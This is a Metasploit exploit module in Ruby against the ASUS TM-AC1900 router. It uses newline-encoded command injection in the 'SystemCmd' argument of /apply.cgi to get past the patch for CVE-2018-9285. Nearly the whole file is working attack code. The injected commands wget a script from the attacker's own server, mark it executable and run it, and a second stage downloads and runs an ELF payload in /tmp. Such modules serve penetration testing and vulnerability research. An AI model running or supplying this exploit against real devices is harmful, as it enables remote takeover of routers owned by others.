##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::HttpServer
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::EXE
    include Msf::Exploit::FileDropper

    def initialize(info = {})
      super(update_info(info,
        'Name'           => 'ASUS TM-AC1900 - Arbitrary Command Execution',
        'Description'    => %q{
          This module exploits a code execution vulnerability within the ASUS
          TM-AC1900 router as an authenicated user. The vulnerability is due to
          a failure filter out percent encoded newline characters (%0a) within
          the HTTP argument 'SystemCmd' when invoking "/apply.cgi" which bypasses
          the patch for CVE-2018-9285.

        },
        'Author'         =>
          [
            'b1ack0wl' # vuln discovery + exploit developer
          ],
        'License'        => MSF_LICENSE,
        'Platform'       => 'linux',
        'Arch'           => ARCH_ARMLE,
        'References'     =>
          [
            # CVE which shows that this functionality has been patched before ;)
            ['URL', 'https://www.cvedetails.com/cve/CVE-2018-9285/'],
            ['URL', 'https://github.com/b1ack0wl/OffensiveCon20/tree/master/TM-AC1900']
          ],
        'Privileged'     => true,
        'Targets'        =>
          [
            # this may work on other asus routers as well, but I've only tested this on the TM-AC1900.
            [ 'ASUS TM-AC1900 <= v3.0.0.4.376_3199',
              {}
            ]
          ],
        'DisclosureDate' => 'April 18, 2020',
        'DefaultTarget' => 0))
      register_options(
          [
            OptString.new('USERNAME', [true, 'Username for the web portal.', 'admin']),
            OptString.new('PASSWORD', [true, 'Password for the web portal.', 'admin'])
          ])
    end

    def check_login
      begin
        res = send_request_cgi({
          'method'  => 'GET',
          'uri'     => "/Main_Analysis_Content.asp",
          'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
        })
        if res and res.code == 200
          # all good :)
          return res
        else
          fail_with(Failure::NoAccess, 'Invalid password.')
        end
      rescue ::Rex::ConnectionError
          fail_with(Failure::Unreachable, 'Connection failed.')
      end
    end

    def on_request_uri(cli, request)
      if request.uri == '/'
        # injected command has been executed
        print_good("Sending bash script...")
        @filename = rand_text_alpha(16)
        bash_script = %Q|
        #!/bin/sh
        wget #{@lhost_srvport}/#{rand_text_alpha(16)} -O /tmp/#{@filename}
        chmod +x /tmp/#{@filename}
        /tmp/#{@filename} &
        |
        send_response(cli, bash_script)
      else
        # bash script has been executed. serve up the ELF file
        exe_payload = generate_payload_exe()
        print_good("Sending ELF file...")
        send_response(cli, exe_payload)
        # clean up
        register_file_for_cleanup("/tmp/index.html")
        register_file_for_cleanup("/tmp/#{@filename}")
      end
    end

    def exploit
      # make sure the supplied password is correct
      check_login
      if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
        srv_host = datastore['LHOST']
      else
       srv_host = datastore['SRVHOST']
      end
      print_status("Exploiting #{target.name}...")
      @lhost_srvport = "#{srv_host}:#{datastore['SRVPORT']}"
      start_service({'Uri' => {'Proc' => Proc.new {
        |cli, req| on_request_uri(cli, req)
        },
          'Path' => '/'
      }})
      begin
        # store the cmd to be executed
        cmd =  "ping+-c+1+127.0.0.1;cd+..;cd+..;cd+tmp;rm+index.html;"
        cmd << "wget+#{@lhost_srvport};chmod+777+index.html;sh+index.html"
        res = send_request_cgi({
          'method'        => 'GET',
          'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
          # spaces need to be '+' and not %20, so cheap hack.exe it is.
          # required HTTP args: SystemCmd, action_mode, and current_page
          'uri'           => "/apply.cgi?SystemCmd=#{cmd.gsub(';',"%0a")}&action_mode=+Refresh+&current_page=Main_Analysis_Content.asp"
        })
        # now trigger it via check_login
        res = check_login
        if res and res.code == 200
          print_status("Waiting up to 10 seconds for the payload to execute...")
          select(nil, nil, nil, 10)
        end
      rescue ::Rex::ConnectionError
        fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
      end
    end
  end